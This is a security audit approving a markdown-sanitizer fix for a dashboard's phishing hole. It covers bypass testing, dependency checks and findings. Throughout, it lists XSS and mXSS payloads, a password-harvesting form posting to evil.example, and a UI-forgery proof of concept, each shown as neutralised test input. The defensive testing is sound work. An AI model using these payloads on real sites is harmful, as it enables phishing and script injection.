# Security Audit — issue #195, markdown sanitizer hardening

**Auditor:** security-auditor (independent)
**Branch:** `markdown-sanitize`
**Range reviewed:** `7a0f220..204af7e` (fix commit `25bab77`, docs commit `204af7e`)
**Date:** 2026-07-27
**Verdict: APPROVE**

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 0 |
| Medium   | 0 |
| Low      | 3 |
| Info     | 4 |

The phishing vector is closed. The script-execution posture is unchanged —
verified by differential testing, not by assertion. The jsdom addition is
correctly scoped dev-only and provably cannot reach production. The checkbox
renderer cannot be reached with attacker-controlled data.

All three Low findings are pre-existing conditions that this branch neither
introduced nor was scoped to fix. None blocks merge.

I verified the developer's claims independently rather than accepting them; where
I reached the same conclusion I say so, and I note the two places where the
developer's report is incomplete.

---

## Methodology

I did not reuse the developer's test suite as evidence. I built three
independent harnesses against the **real exported `renderMarkdown`** (compiled
from `web/src/util/markdown.ts`, not a replica), with `DOMPurify.isSupported`
asserted `true` (dompurify 3.4.12, marked 15.0.12, jsdom 29.1.1):

1. **Bypass harness** — 110 payloads across 9 classes: malformed/case-varied
   markup, HTML entity encodings, SVG/MathML foreign content and namespace
   confusion, historical DOMPurify mXSS shapes, markdown constructs that emit raw
   HTML, residual interactive tags, script-execution regressions, checkbox
   probing, and sanitize-idempotence.
2. **A/B differential** — a 117-payload corpus run through *both* the pre-change
   pipeline (`marked.parse` + bare `DOMPurify.sanitize`, verbatim from
   `7a0f220`) and the new one, comparing resulting tag/attribute/URL sets. Any
   payload where the new pipeline is *less* sanitized is a regression.
3. **Context-reparse harness** — re-parsing sanitized output the way Lit's
   `unsafeHTML` actually does (inside a `<template>`) as well as in a `<div>`, to
   catch mXSS arising from the parse-context change between DOMPurify's
   serialization and the sink.

Scratch harnesses were deleted; the working tree is clean.

---

## 1. Is the phishing vector closed? — **Yes**

`web/src/util/markdown.ts:11,16,30-35`.

**110/110 bypass payloads neutralized. Zero form-control survivors.**

The primary payload:

```
in : <form action="https://evil.example"><input name=token type=password><button>Sign in</button></form>
out: "Sign in"
```

Only the button's text node survives. Attempted bypasses, all blocked:

| Class | Representative payload | Result |
|---|---|---|
| Case variation | `<FORM ACTION=…><INPUT TYPE=PASSWORD>` | `""` |
| Malformed tag | `<form/action=…>`, `<for<form>m …>`, newline/tab in tag | inert text |
| Entity encoding | `&#60;form&#62;`, `&#x3c;input&#x3e;`, entity in attr name | escaped text |
| SVG foreign content | `<svg><foreignObject><form …><input type=password>` | `<p><svg></svg></p>` |
| SVG integration pts | `<svg><desc><form …>`, `<svg><title><form …>` | element emptied |
| MathML namespace | `<math><annotation-xml encoding="text/html"><form …>` | `<p><math></math></p>` |
| MathML text | `<math><mtext><form …>`, `<math><ms><form …>` | element emptied |
| Historic mXSS | `<form><math><mtext></form><form><mglyph><style></math><img src onerror=…>` | `<math><mtext></mtext></math>` |
| Table foster-parenting | `<table><form …><input type=password></table>` | `<table></table>` |
| `noscript`/`noembed`/`xmp`/`plaintext` wrappers | `<noscript><form …>` | emptied |
| `<template>` wrapper | `<template><form …><input …>` | `<template></template>` |
| Select/option mutation | `<select><option><form …>`, nested `<select>` | `<p></p>` |
| Markdown raw-HTML emitters | html block, inline html, blockquote, list item, table cell, heading, link-ref | all stripped |

**Namespace confusion specifically:** DOMPurify's `_checkValidNamespace` handles
these correctly and `FORBID_TAGS` matching is namespace-independent and
case-folded. `<form>` inside SVG/MathML — including at the HTML integration
points `foreignObject`, `desc`, `title`, and `annotation-xml` — is removed.

**Idempotence / mXSS-on-reparse:** re-running `renderMarkdown` over its own
output is a fixed point after one pass for all tested payloads; no form control
is revived by re-serialization.

**Sink-context mXSS:** 13 payloads re-parsed both inside a `<template>` (Lit's
`unsafeHTML` path) and inside a `<div>` (the actual sink markup at
`ft-inspector-desc.ts:233` and `ft-inspector-comments.ts:221`). Zero
divergence-induced survivors. Both sinks are plain `<div>` elements, not
table/select contexts, which is the safe case.

**Belt-and-braces claim verified.** The developer states tag and attribute are
both forbidden so neither is load-bearing. I confirmed this is genuinely true
for `action`: the A/B differential shows `action` surviving the *old* pipeline
(so it is in DOMPurify's default `ALLOWED_ATTR`) and removed by the new one.
The developer's secondary claim that `formaction` is redundant is also correct —
it never appears in the old pipeline's output, so DOMPurify strips it by default.

---

## 2. Is the script-execution posture unchanged? — **Yes, provably**

**A/B differential result: `corpus=117, identical=81, tighter=36, REGRESSIONS=0`.**

Not one payload produced a tag, attribute, or URL under the new pipeline that
did not also appear under the old one. Every difference is strictly a removal.
The 36 "tighter" cases are exactly the intended ones (`form`, `input`, `button`,
`select`, `option`, `textarea`, `action`, `style`, `download`).

This is the strongest available answer to the regression question: it does not
depend on my choice of payloads being exhaustive, because it compares the two
configurations against the *same* inputs.

Direct re-check of the script-execution set (all blocked, unchanged from base):

```
<script>alert(1)</script>                    -> ""
<img src=x onerror=alert(1)>                 -> <img src="x">
<svg onload=alert(1)>                        -> <p><svg></svg></p>
[click](javascript:alert(1))                 -> <p><a>click</a></p>
<a href="java&#115;cript:alert(1)">          -> <p><a>x</a></p>
data:text/html;base64,…                      -> <p><a>c</a></p>
<iframe srcdoc="<script>alert(1)</script>">  -> ""
mglyph/mtext/table mXSS                      -> <p><math><mtext><table></table></mtext></math></p>
<base href="https://evil.example/">          -> ""
<meta http-equiv="refresh" …>                -> ""
<object>/<embed>                             -> <p></p>
<style>body{display:none}</style>            -> ""
<a target="_blank">                          -> target stripped
<svg><animate attributeName=href values=javascript:…>  -> stripped
<svg><use xlink:href="data:image/svg+xml;base64,…">    -> <p><svg></svg></p>
<img srcset="javascript:alert(1)">           -> <img>
```

Additional confirmation that DOMPurify's own protections are intact and were not
disturbed: custom elements are still rejected (`<sl-details>`, `<sl-button>`,
`<ft-inspector-desc>` → stripped), `is=` is emptied, and DOM-clobbering-sensitive
attributes are still removed (`<a id="shadowRoot">` → `id` dropped,
`<img name="body">` → `name` dropped).

The `FORBID_TAGS`/`FORBID_ATTR` arrays are module-level and passed by reference
on every call; DOMPurify reads but does not mutate them. Verified empirically —
after 50 calls the config still blocks the primary payload.

---

## 3. Supply chain — **legitimate, dev-only, cannot reach production**

- **`jsdom@29.1.1` is real** (published 2026-04-30, last of the 29.x line,
  maintainers `domenic`/`timothygu`/`sebmaster`/`zirro`). `jsdom@30.0.0` was
  published today; `^29.1.1` will not float to it.
- **`@types/jsdom@28.0.3` is real and is `latest`.**
- **On the major-version mismatch:** it is unavoidable, not an error. There is no
  `@types/jsdom` 29 or 30 on the registry — the version list ends at 28.0.3.
  jsdom ships no bundled types (`npm view jsdom@29.1.1 types` is empty), so
  `@types/jsdom` is genuinely required, and DefinitelyTyped lagging the runtime
  is normal. Security impact is nil: types are erased at compile time and
  contribute no runtime code. The only practical risk is a stale signature
  masking a type error, and `npx tsc --noEmit` exits 0. *The developer's report
  does not mention or explain this mismatch — it should have, but the conclusion
  is unaffected.*
- **43 lockfile entries added, all additive.** No existing entry was removed or
  version-bumped (`grep '^-    "node_modules/'` on the lock diff is empty), so no
  production dependency was silently changed alongside the feature.
- **All 43 carry `"dev": true`.** No exceptions. `npm ls --omit=dev jsdom` → empty.
- **All 43 resolve to `https://registry.npmjs.org` with `sha512` integrity.** No
  git URLs, no `http://`, no alternate registries. Every one of the 43 pinned
  hashes was fetched from the live registry and **byte-matched** — the lock was
  produced by a genuine resolve and has not been hand-edited.
- **No install scripts.** No `hasInstallScript`, `preinstall`, `install`, or
  `postinstall` on any added entry. This matters because `make web` runs
  `npm ci`, which *does* execute lifecycle scripts.
- **`npm audit --audit-level=low` → 0 vulnerabilities** (151 packages).
- The unfamiliar names in the subtree (`@asamuzakjp/*`, `@exodus/bytes`,
  `css-tree`, `tldts`, `undici`) are not anomalies: jsdom 29 restructured its CSS
  stack and replaced the proxy-agent chain with `undici`. Each traces to a
  declared jsdom 29 dependency, with expected upstream maintainers. No typosquat
  indicators.

**Can it reach production?** No — verified by building, not by inspection:

```
$ rm -rf dist && npm run build && grep -rl "jsdom\|JSDOM" dist/
dist/assets/index-DkAVF9N3.js.map
```

That single hit is a **false positive** and I chased it down: it is the string
`// In JSDOM, if we're inside shadow DOM, then parentNode` — a *source comment
inside dompurify's own bundled source*, an existing production dependency. Parsing
the map confirms it:

```
total sources: 276
sources matching /\.test\./ : []
sources matching /jsdom/i   : []
```

No test file and no jsdom source is in the bundle or its map. Three independent
barriers hold: (a) the only `jsdom` import in the repo is
`web/src/util/markdown.test.ts:8`; (b) vite's entry is `web/index.html` →
`src/index.ts`, whose import graph never reaches a `.test` module; (c)
`tsconfig.test.json` emits to `web/.tmp-test/`, a *sibling* of `web/dist`, and is
gitignored. `web/dist` is not committed (`git ls-files web/dist` → 0 files), so
`//go:embed all:web/dist` in `assets.go:5` ships only what vite produced.

One nuance worth recording: `"build": "tsc --noEmit && vite build"` with
`tsconfig.json` `include: ["src"]` means `markdown.test.ts` *is* type-checked
during a production build, so `@types/jsdom` is a genuine build-time
dependency. `tsc --noEmit` emits nothing, so this creates no path into `dist`.

---

## 4. Checkbox renderer — **no attacker-controlled data reaches it**

`web/src/util/markdown.ts:23-28`.

Confirmed at the source in `node_modules/marked/lib/marked.cjs:1519`:

```js
const checkbox = this.checkbox({ checked: !!item.checked });
```

The `!!` coercion happens in marked, *before* the override is invoked, so
`checked` is provably a primitive `true` or `false`. The override's template
literal therefore admits exactly two outputs:

```
<span class="ft-task-checkbox">☑</span>
<span class="ft-task-checkbox">☐</span>
```

There is no interpolation of token text, `raw`, or any other attacker-reachable
field. I probed 10 task-list shapes (loose/tight, ordered/unordered, nested three
deep, in blockquote, in table cell, uppercase `[X]`, inline code, and a task item
whose *body* is a phishing form). In every case the emitted span is one of the two
constants and the item body is separately sanitized:

```
- [x] <form action="https://evil.example"><input type=password>
  -> <ul><li><span class="ft-task-checkbox">☑</span> </li></ul>
```

Smuggling is impossible for a second, independent reason: the renderer runs
*before* `DOMPurify.sanitize`, so even a hypothetical injection would still be
sanitized. The design choice to substitute in marked rather than relax
`FORBID_TAGS` with an `afterSanitizeAttributes` hook is the right one — it keeps
the allowlist un-widened and avoids registering a hook on DOMPurify's global
singleton. I agree with the developer's reasoning here.

**One maintenance note (Info-3 below):** in the *loose* list path
(`marked.cjs:1522-1531`) marked splices the renderer's return value into a
token's `.text` field and sets `escaped = true`. That is safe today because the
value is a constant, but it means renderer output is injected pre-escaped. Any
future change that interpolates token data into this renderer would bypass
marked's escaping and would be relying solely on DOMPurify to catch it.

---

## Findings

### [LOW-1] Attacker-supplied `class` values can reuse the inspector's own shadow-DOM styles to forge UI

- **Location:** `web/src/util/markdown.ts:16` (`FORBID_ATTR` omits `class`);
  sinks `web/src/components/inspector/ft-inspector-comments.ts:221`,
  `ft-inspector-desc.ts:233`
- **Description:** `class` is in DOMPurify's default `ALLOWED_ATTR` and is not
  forbidden. Both sinks inject sanitized markdown *inside the Lit shadow root
  that carries the component's own stylesheet*, so attacker-chosen class names
  resolve against real component CSS (`.comment`, `.comment-header`,
  `.comment-author`, `.comment-time`, `.comment-body`, `.section-header`,
  `.section-title`, `.content`, `.empty`).
- **Impact:** Pixel-accurate forgery of a Farm Table comment header — including a
  fake author and timestamp — *inside* a real comment body, without any inline
  `style`. Removing the `style` attribute (correctly) does not close this.
- **Proof of concept:** input, and byte-identical output, verified:

  ```html
  <div class="comment"><div class="comment-header">
  <span class="comment-author">farmtable-admin</span>
  <span class="comment-time">2 minutes ago</span></div>
  <div class="comment-body">Your session expired.
  <a href="https://evil.example/login">Re-authenticate here</a>.</div></div>
  ```

- **Why Low, not higher:** there is no in-page credential capture — the victim
  must click through to an external origin, which is no worse than an ordinary
  markdown link. The branch's actual objective (killing same-origin credential
  harvesting) is met. This is also **pre-existing**: `class` survived the old
  pipeline identically, so it is not a regression.
- **Recommendation:** do not fix on this branch. Track separately. The cheapest
  robust fix is to namespace rendered markdown rather than denylist class names:

  ```ts
  // in the sanitizer, prefix every surviving class so it cannot match app CSS
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.hasAttribute?.('class')) {
      node.setAttribute('class',
        node.getAttribute('class')!.split(/\s+/).map(c => `md-${c}`).join(' '));
    }
  });
  ```

  Note this registers on the global singleton — the same objection the developer
  raised against hooks. An alternative with no hook is adding `class` to
  `FORBID_ATTR` outright; markdown does not need it, and the only class the
  pipeline emits is the one the checkbox renderer adds, which would need to
  become an element or attribute the sanitizer preserves by other means.

### [LOW-2] No Content-Security-Policy on the dashboard

- **Location:** deploy/server configuration; no CSP header is set for the
  embedded dashboard served from `assets.go:5`
- **Description:** `form-action 'self'` would have independently prevented this
  entire bug class regardless of sanitizer configuration, and `script-src` would
  backstop the DOMPurify properties the new suite pins. Today the sanitizer is
  the single point of failure for a page that renders third-party HTML through
  `unsafeHTML`.
- **Impact:** Defense-in-depth only — no exploitable path exists while the
  sanitizer behaves as verified above.
- **Recommendation:** file separately against deploy config. Start with
  `default-src 'self'; form-action 'self'; object-src 'none'; base-uri 'none'`.
  Shoelace/Lit will need `style-src 'self' 'unsafe-inline'` for adopted
  stylesheets. Independently identified by the developer; I agree and rate it the
  highest-value follow-up from this work.

### [LOW-3] Production build ships a 2.47 MB source map — *out of scope, noted for completeness*

- **Location:** `web/vite.config.ts` (`sourcemap: true`) →
  `dist/assets/index-DkAVF9N3.js.map`, embedded via `//go:embed all:web/dist`
- **Status:** Pre-existing at base `7a0f220` and on `origin/main`; explicitly
  excluded from this branch by the reviewer's brief and tracked separately. **Not
  a defect of this change and must not be fixed here.**
- **Severity comment (requested):** I concur with **Low**. It is information
  disclosure of TypeScript sources to any authenticated dashboard user, not a
  privilege boundary crossing. It slightly *raises* the value of the other
  findings by making the client's exact sanitizer configuration trivially
  readable — but an attacker could infer that from behaviour anyway, and the
  sanitizer's security does not depend on obscurity. Worth fixing on the
  deploy-prep branch that owns `vite.config.ts`, not urgently.
- **Note:** this branch does **not** worsen it. I confirmed the map contains no
  test sources and no jsdom source (276 sources, zero matching `/\.test\./`), so
  the new test file does not leak through it.

### [INFO-1] Substring assertions in the test suite are brittle

`web/src/util/markdown.test.ts:93` asserts `assertNotContains(phishing, 'action')`
and `:135` asserts absence of `'download'`. These are raw substring checks over
the whole output; a future payload whose *text content* legitimately contains
"action" or "download" would produce a confusing failure. Correct today. Consider
asserting on attribute presence via the parsed DOM in addition to the raw string.

### [INFO-2] Test coverage gap: no pinned cases for foreign content or malformed markup

The suite's 32 checks cover the direct payloads well but contain no
SVG/MathML/`foreignObject`/`annotation-xml` cases and no malformed-tag cases.
All pass today (I verified 110), but they are the shapes most likely to break on
a DOMPurify or marked major bump, and they are exactly what a regression suite
should pin. Recommend adding a handful from the table in §1.

### [INFO-3] Checkbox renderer output is injected pre-escaped in marked's loose-list path

See §4. Safe today because the value is constant. Worth a comment at
`web/src/util/markdown.ts:25` warning that the renderer must never interpolate
token data.

### [INFO-4] `FORBID_TAGS` / `FORBID_ATTR` are shared mutable arrays

`web/src/util/markdown.ts:11,16` are module-level `const` arrays passed by
reference into DOMPurify on every call. DOMPurify does not mutate them (verified:
still blocking after 50 calls), and the module exports only `renderMarkdown`, so
they are unreachable externally. `Object.freeze` would make the intent explicit
at zero cost. Not required.

---

## Positive observations

- **The right defect was fixed.** The change correctly treats this as a phishing
  problem, not XSS, and the code comment at `markdown.ts:4-10` records the
  provenance reasoning — which I confirmed independently at
  `internal/platform/github/github.go:163` (`Description: issue.GetBody()`) and
  `internal/platform/github/passthrough.go:138`.
- **Genuine belt-and-braces, not a claim.** Forbidding both tag and attribute is
  verifiably non-redundant for `action`, and the A/B differential proves neither
  rule is silently doing nothing.
- **The `new Marked({...})` instance instead of `marked.use()`** avoids mutating
  global parser state — a real correctness win for a shared singleton, and the
  same instinct that correctly rejected a global DOMPurify hook.
- **Substituting the checkbox in marked rather than relaxing `FORBID_TAGS`** is
  the security-correct trade. It keeps the allowlist un-widened, which is why the
  task-list checks did *not* fail under the developer's config-revert mutation —
  a property worth preserving.
- **The suite pins script-execution properties that were already passing.** This
  is the highest-value part of the change: those cases were previously unpinned,
  so a future config edit could have reopened them silently.
- **Mutation testing was actually performed**, and the developer correctly
  identified that the mXSS case passes a DOM-query assertion even when
  unsanitized (foster-parenting removes the `<img>` on reparse) — a real false-
  negative trap. The dual raw-string + structural assertion is the right response
  and should not be simplified.
- **The developer disclosed the source-map gate failure rather than quietly
  passing it**, and correctly declined to fix shared build infrastructure outside
  the branch's scope.
- **Supply chain hygiene:** `npm ci` (lock-respecting) in `make web`, purely
  additive lock diff, no install scripts, correct dev scoping.

---

## Recommendations

1. **Merge as-is.** No changes required on this branch.
2. File **LOW-2 (CSP)** as its own issue against deploy config. `form-action
   'self'` makes this entire bug class structurally impossible.
3. File **LOW-1 (class reuse)** as a follow-up. It is the residual half of the
   spoofing surface that removing `style` did not cover.
4. Leave **LOW-3 (source map)** with whoever owns `vite.config.ts` on the
   deploy-prep branches, as already agreed.
5. Consider **INFO-2** — add foreign-content and malformed-markup cases to the
   suite before the next `dompurify` or `marked` major bump.
6. Beyond security scope, surfaced for the manager's decision only: the tests run
   under jsdom, so they pin jsdom's parser behaviour, not Chromium's. mXSS is
   parser-specific. This matches the original audit and the repo has no browser
   test harness, so it is acceptable — but it is a real limit on the strength of
   the mXSS guarantee and should be stated wherever that guarantee is relied on.

---

## Verification performed

```
npm ci                          # clean install, 0 vulnerabilities
npm test                        # markdown sanitizer: 32 checks passed
npx tsc --noEmit                # exit 0
npm run build                   # ✓ built in 5.81s
go build ./...                  # clean
independent bypass harness      # 110 payloads, 0 survivors
independent A/B differential    # 117 payloads, 0 regressions, 36 tighter
context-reparse harness         # 13 payloads, 0 failures
sourcemap source inventory      # 276 sources, 0 test/jsdom sources
lockfile integrity spot-check   # 43/43 hashes match live registry
```

Scratch harnesses removed; `git status` clean at time of writing.
